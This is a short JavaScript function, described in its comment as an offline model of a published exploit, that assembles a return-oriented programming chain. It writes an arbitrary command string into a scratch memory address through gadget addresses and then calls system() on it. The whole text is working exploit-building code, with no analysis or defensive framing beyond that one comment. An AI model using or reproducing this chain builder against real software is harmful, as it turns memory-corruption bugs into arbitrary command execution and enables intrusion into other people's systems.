// Offline model of the published command-writing ROP chain; no transport.
function commandChain(gadgets, scratch, command) {
  const words = [];
  const bytes = Buffer.from(command + '\0');
  for (let i = 0; i < bytes.length; i += 8) {
    const chunk = Buffer.alloc(8);
    bytes.copy(chunk, 0, i, i + 8);
    words.push(gadgets.pop_rdi_ret);
    words.push(scratch + BigInt(i));
    words.push(gadgets.pop_rsi_ret);
    words.push(chunk.readBigUInt64LE());
    words.push(gadgets.write_rdi_rsi_ret);
  }
  words.push(gadgets.pop_rdi_ret);
  words.push(scratch);
  words.push(gadgets.system_plt);
  return words;
}
